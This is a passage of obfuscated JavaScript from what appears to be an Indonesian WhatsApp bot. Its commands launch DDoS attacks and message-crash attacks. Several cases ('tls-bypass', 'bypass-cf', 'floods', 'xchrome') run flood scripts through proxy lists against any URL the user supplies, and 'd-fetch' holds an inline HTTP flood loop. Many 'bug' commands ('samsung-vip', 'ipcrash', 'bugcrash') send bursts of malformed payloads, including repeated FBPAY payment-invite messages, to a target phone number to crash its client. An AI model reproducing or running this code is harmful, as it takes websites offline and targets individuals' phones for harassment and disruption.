            _0x41d276("Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: " + _0x5e1572 + " 👤 Proses ini diperkirakan akan berlangsung selama " + _0x1302a7 + " detik. Terima kasih atas kesabaran Anda.");
            _0x5a36ba("node ./lib/ddos/kilua.js " + _0x5e1572 + " " + _0x1302a7 + " " + _0x3c4dcf + " proxy.txt " + _0xdae13 + " ua.txt", (_0x2ddb4b, _0x5a9a42) => {
              if (_0x2ddb4b) {
                return console.log(_0x2ddb4b.toString());
              }
              if (_0x5a9a42) {
                return console.log(util.format(_0x5a9a42));
              }
            });
          } else {
            _0x41d276("Format pesan tidak benar. Gunakan format: ." + _0x63bd7f + " [url] [time] [thread] [rate]");
          }
        }
        break;
      case "tls-bypass":
        {
          if (!_0x4d4b5c) {
            return _0x41d276(global.nocreator);
          }
          let _0x5626da = q.split(" ")[0];
          let _0xa7873d = q.split(" ")[1];
          let _0x56b871 = q.split(" ")[2];
          let _0x2233bf = q.split(" ")[3];
          if (_0xe61016.length === 4 && _0x5626da && _0xa7873d && _0x56b871 && _0x2233bf) {
            _0x41d276("Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: " + _0x5626da + " 👤 Proses ini diperkirakan akan berlangsung selama " + _0xa7873d + " detik. Terima kasih atas kesabaran Anda.");
            _0x5a36ba("node ./lib/ddos/tls-bypass.js " + _0x5626da + " " + _0xa7873d + " " + _0x2233bf + " " + _0x56b871, (_0x2d968d, _0x22e62f) => {
              if (_0x2d968d) {
                return console.log(_0x2d968d.toString());
              }
              if (_0x22e62f) {
                return console.log(util.format(_0x22e62f));
              }
            });
          } else {
            _0x41d276("Format pesan tidak benar. Gunakan format: ." + _0x63bd7f + " [url] [time] [thread] [rate]");
          }
        }
        break;
      case "bypass-cf":
        {
          if (!_0x4d4b5c) {
            return _0x41d276(global.nocreator);
          }
          let _0x5e4a9c = q.split(" ")[0];
          let _0xbcef58 = q.split(" ")[1];
          let _0x1ac833 = q.split(" ")[2];
          let _0x53f876 = q.split(" ")[3];
          if (_0xe61016.length === 4 && _0x5e4a9c && _0xbcef58 && _0x1ac833 && _0x53f876) {
            _0x41d276("Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: " + _0x5e4a9c + " 👤 Proses ini diperkirakan akan berlangsung selama " + _0xbcef58 + " detik. Terima kasih atas kesabaran Anda.");
            _0x5a36ba("node ./lib/ddos/bypass.js " + _0x5e4a9c + " " + _0xbcef58 + " " + _0x53f876 + " " + _0x1ac833 + " proxy.txt", (_0x366617, _0x1b2be1) => {
              if (_0x366617) {
                return console.log(_0x366617.toString());
              }
              if (_0x1b2be1) {
                return console.log(util.format(_0x1b2be1));
              }
            });
          } else {
            _0x41d276("Format pesan tidak benar. Gunakan format: ." + _0x63bd7f + " [url] [time] [thread] [rate]");
          }
        }
        break;
      case "tls-vip":
        {
          if (!_0x4d4b5c) {
            return _0x41d276(global.nocreator);
          }
          let _0x2872a2 = q.split(" ")[0];
          let _0x488959 = q.split(" ")[1];
          let _0x1643b8 = q.split(" ")[2];
          let _0x2e8f13 = q.split(" ")[3];
          if (_0xe61016.length === 4 && _0x2872a2 && _0x488959 && _0x1643b8 && _0x2e8f13) {
            _0x41d276("Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: " + _0x2872a2 + " 👤 Proses ini diperkirakan akan berlangsung selama " + _0x488959 + " detik. Terima kasih atas kesabaran Anda.");
            _0x5a36ba("node ./lib/ddos/tlsvip.js " + _0x2872a2 + " " + _0x488959 + " " + _0x2e8f13 + " " + _0x1643b8 + " proxy.txt", (_0x13cf34, _0x516efd) => {
              if (_0x13cf34) {
                return console.log(_0x13cf34.toString());
              }
              if (_0x516efd) {
                return console.log(util.format(_0x516efd));
              }
            });
          } else {
            _0x41d276("Format pesan tidak benar. Gunakan format: ." + _0x63bd7f + " [url] [time] [thread] [rate]");
          }
        }
        break;
      case "floods":
        {
          if (!_0x4d4b5c) {
            return _0x41d276(global.nocreator);
          }
          let _0x506945 = q.split(" ")[0];
          let _0x38cf0a = q.split(" ")[1];
          let _0x1e14cc = q.split(" ")[2];
          let _0x536f3a = q.split(" ")[3];
          if (_0xe61016.length === 4 && _0x506945 && _0x38cf0a && _0x1e14cc && _0x536f3a) {
            _0x41d276("Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: " + _0x506945 + " 👤 Proses ini diperkirakan akan berlangsung selama " + _0x38cf0a + " detik. Terima kasih atas kesabaran Anda.");
            _0x5a36ba("node ./lib/ddos/floods.js " + _0x506945 + " " + _0x38cf0a + " " + _0x536f3a + " " + _0x1e14cc + " proxy.txt", (_0x20186d, _0x2eb430) => {
              if (_0x20186d) {
                return console.log(_0x20186d.toString());
              }
              if (_0x2eb430) {
                return console.log(util.format(_0x2eb430));
              }
            });
          } else {
            _0x41d276("Format pesan tidak benar. Gunakan format: ." + _0x63bd7f + " [url] [time] [thread] [rate]");
          }
        }
        break;
      case "egao":
        {
          if (!_0x4d4b5c) {
            return _0x41d276(global.nocreator);
          }
          let _0x196073 = q.split(" ")[0];
          let _0x4bb68f = q.split(" ")[1];
          let _0x3b1ba9 = q.split(" ")[2];
          let _0x2dba71 = q.split(" ")[3];
          if (_0xe61016.length === 4 && _0x196073 && _0x4bb68f && _0x3b1ba9 && _0x2dba71) {
            _0x41d276("Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: " + _0x196073 + " 👤 Proses ini diperkirakan akan berlangsung selama " + _0x4bb68f + " detik. Terima kasih atas kesabaran Anda.");
            _0x5a36ba("node ./lib/ddos/hentai.js " + _0x196073 + " " + _0x4bb68f + " " + _0x2dba71 + " " + _0x3b1ba9 + " proxy.txt", (_0x26bbcd, _0x4edce3) => {
              if (_0x26bbcd) {
                return console.log(_0x26bbcd.toString());
              }
              if (_0x4edce3) {
                return console.log(util.format(_0x4edce3));
              }
            });
          } else {
            _0x41d276("Format pesan tidak benar. Gunakan format: ." + _0x63bd7f + " [url] [time] [thread] [rate]");
          }
        }
        break;
      case "xchrome":
        {
          if (!_0x4d4b5c) {
            return _0x41d276(global.nocreator);
          }
          let _0x1958fd = q.split(" ")[0];
          let _0x4f8560 = q.split(" ")[1];
          let _0x4cce93 = q.split(" ")[2];
          let _0x1c7d64 = q.split(" ")[3];
          if (_0xe61016.length === 4 && _0x1958fd && _0x4f8560 && _0x4cce93 && _0x1c7d64) {
            _0x41d276("Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: " + _0x1958fd + " 👤 Proses ini diperkirakan akan berlangsung selama " + _0x4f8560 + " detik. Terima kasih atas kesabaran Anda.");
            _0x5a36ba("node ./lib/ddos/chromev3.js " + _0x1958fd + " " + _0x4f8560 + " " + _0x1c7d64 + " " + _0x4cce93 + " proxy.txt", (_0x343e53, _0x481453) => {
              if (_0x343e53) {
                return console.log(_0x343e53.toString());
              }
              if (_0x481453) {
                return console.log(util.format(_0x481453));
              }
            });
          } else {
            _0x41d276("Format pesan tidak benar. Gunakan format: ." + _0x63bd7f + " [url] [time] [thread] [rate]");
          }
        }
        break;
      case "d-fetch":
        {
          if (!_0x4d4b5c) {
            return _0x41d276(global.nocreator);
          }
          let _0x374c00 = q.split(" ")[0];
          let _0x3d961a = q.split(" ")[1];
          let _0xbb9b73 = q.split(" ")[2];
          let _0x3c7fd4 = q.split(" ")[3];
          if (_0xe61016.length === 4 && _0x374c00 && _0x3d961a && _0xbb9b73 && _0x3c7fd4) {
            let _0x490690 = () => {
              let _0x1464a6 = 0;
              let _0x4cf62c = [];
              for (let _0x2e5909 = 0; _0x2e5909 < _0xbb9b73; _0x2e5909++) {
                _0x4cf62c.push(new Promise((_0x258525, _0x1ef6f0) => {
                  let _0x3470b7 = setInterval(() => {
                    for (let _0xda2505 = 0; _0xda2505 < _0x3c7fd4; _0xda2505++) {
                      fetch(_0x374c00).then(() => {
                        _0x1464a6++;
                        console.log("Attacking => " + _0x374c00 + " Total Requests: " + _0x1464a6 + " Duration: " + _0x3d961a);
                      })["catch"](_0x31ef61 => {});
                    }
                  }, 750);
                  setTimeout(() => {
                    clearInterval(_0x3470b7);
                    _0x258525();
                  }, _0x3d961a);
                }));
              }
              Promise.all(_0x4cf62c).then(() => console.log("Attack complete"))["catch"](_0x3c05bd => console.error("Error in attack:", _0x3c05bd));
            };
            _0x490690();
          } else {
            _0x41d276("Format pesan tidak benar. Gunakan format: ." + _0x63bd7f + " [url] [time] [thread] [rate]");
          }
        }
        break;
      case "bug-vip":
      case "oppo-vip":
      case "vivo-vip":
      case "xiaomi-vip":
      case "infinix-vip":
      case "tecno-vip":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x4c6e64 = 0; _0x4c6e64 < 5; _0x4c6e64++) {
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x2a4ade(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x2a4ade(Pe);
          await sleep(2000);
          await _0x455c3d(Pe);
          await _0x18d90c(Pe);
          await _0x54e078(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x2dc52e(Pe);
          await _0x4375af(Pe);
          await _0x520740(Pe);
          await _0xeab195(Pe);
          await _0x97aad7(Pe);
          await _0x54e078(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await sleep(2000);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x2a4ade(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x2a4ade(Pe);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "samsung-vip":
        if (!_0x4d4b5c) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x20de50 = 0; _0x20de50 < 6; _0x20de50++) {
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x455c3d(Pe);
          await _0x18d90c(Pe);
          await _0x54e078(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x2dc52e(Pe);
          await _0x4375af(Pe);
          await _0x520740(Pe);
          await _0xeab195(Pe);
          await _0x97aad7(Pe);
          await _0x54e078(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await sleep(2000);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case '🍁':
      case '✨':
      case '💯':
      case '💋':
      case '👅':
      case '🌀':
      case '⚡':
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x3c8ad7 = 0; _0x3c8ad7 < 6; _0x3c8ad7++) {
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x40fd73(Pe);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x2a4ade(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x2a4ade(Pe);
          await sleep(2000);
          await _0x455c3d(Pe);
          await _0x18d90c(Pe);
          await _0x54e078(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x2dc52e(Pe);
          await _0x4375af(Pe);
          await _0x520740(Pe);
          await _0xeab195(Pe);
          await _0x97aad7(Pe);
          await _0x54e078(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await sleep(2000);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x2a4ade(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x2a4ade(Pe);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "ipcrash":
      case "bugiospc":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x39d8d1 = 0; _0x39d8d1 < 6; _0x39d8d1++) {
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 86400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 86400000000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(2000);
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 86400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 86400000000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(2000);
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 86400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 86400000000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "jids-engine":
      case "jids-internal":
      case "jids-external":
      case "jids-system":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x4d6220 = 0; _0x4d6220 < 6; _0x4d6220++) {
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x40fd73(Pe);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x2a4ade(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x2a4ade(Pe);
          await sleep(2000);
          await _0x455c3d(Pe);
          await _0x18d90c(Pe);
          await _0x54e078(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x2dc52e(Pe);
          await _0x4375af(Pe);
          await _0x520740(Pe);
          await _0xeab195(Pe);
          await _0x97aad7(Pe);
          await _0x54e078(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await sleep(2000);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x2a4ade(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x2a4ade(Pe);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "super-vip":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x3bb55e = 0; _0x3bb55e < 5; _0x3bb55e++) {
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x455c3d(Pe);
          await _0x18d90c(Pe);
          await _0x54e078(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x2dc52e(Pe);
          await _0x4375af(Pe);
          await _0x520740(Pe);
          await _0xeab195(Pe);
          await _0x97aad7(Pe);
          await _0x54e078(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await sleep(2000);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "blok":
      case "block":
        if (!_0x4cefc4) {
          return _0x18a4d7.reply(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.updateBlockStatus(Pe, "block");
        _0x41d276("Sukses block target");
        break;
      case "unblok":
      case "unblock":
        if (!_0x4cefc4) {
          return _0x18a4d7.reply(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.updateBlockStatus(Pe, "unblock");
        _0x41d276("Sukses unblock target");
        break;
      case "bugcrash":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x217913 = 0; _0x217913 < 6; _0x217913++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
